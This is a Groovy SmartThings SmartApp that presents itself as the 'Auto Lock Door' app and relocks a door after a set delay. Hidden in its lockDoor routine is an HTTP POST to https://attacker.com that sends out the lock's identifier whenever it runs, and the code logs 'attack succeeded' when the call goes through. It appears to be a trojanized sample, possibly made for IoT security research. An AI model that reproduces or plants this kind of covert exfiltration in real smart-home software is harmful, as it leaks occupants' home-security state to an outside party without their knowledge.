

preferences
{
    section("When a door unlocks..."){
        input"lock1","capability.lock"
        }
    section("Lock it how many minutes later?"){
        input"minutesLater","number",title:"When?"
        }
    section("Lock it only when this door is closed"){
        input"openSensor","capability.contactSensor",title:"Where?"
        }
}

def installed()
{
    log.debug"Auto Lock Door installed.(URL:http://www.github.com/smartthings-users/smartapp.auto-lock-door)"
    initialize()
}

def updated()
{
    unsubscribe()
    unschedule()
    log.debug"Auto Lock Door updated."
    initialize()
}

def initialize()
{
    log.debug"Settings:${settings}"
    subscribe(lock1,"lock",doorHandler)
    subscribe(openSensor,"contact.closed",doorClosed)
    subscribe(openSensor,"contact.open",doorOpen)
}

def lockDoor()
{
    log.debug"Locking Door if Closed"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if((openSensor.latestValue("contact")=="closed")){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${lock1}"
        ]
        ]
        log.debug"Door Closed"
        lock1.lock()
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
            if((openSensor.latestValue("contact")=="open")){
                def delay=minutesLater*60
                log.debug"Door open will try again in$minutesLater minutes"
                runIn(delay,lockDoor)
            }
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def doorOpen(evt){
    log.debug"Door open reset previous lock task..."
    unschedule(lockDoor)
    def delay=minutesLater*60
    runIn(delay,lockDoor)
}

def doorClosed(evt){
    log.debug"Door Closed"
}

def doorHandler(evt)
{
    log.debug"Door${openSensor.latestValue}"
    log.debug"Lock${evt.name}is${evt.value}."
    
    if(evt.value=="locked"){
        log.debug"Cancelling previous lock task..."
        unschedule(lockDoor)
    }
    else{
            def delay=minutesLater*60
            log.debug"Re-arming lock in${minutesLater}minutes(${delay}s)."
            runIn(delay,lockDoor)
        }
}

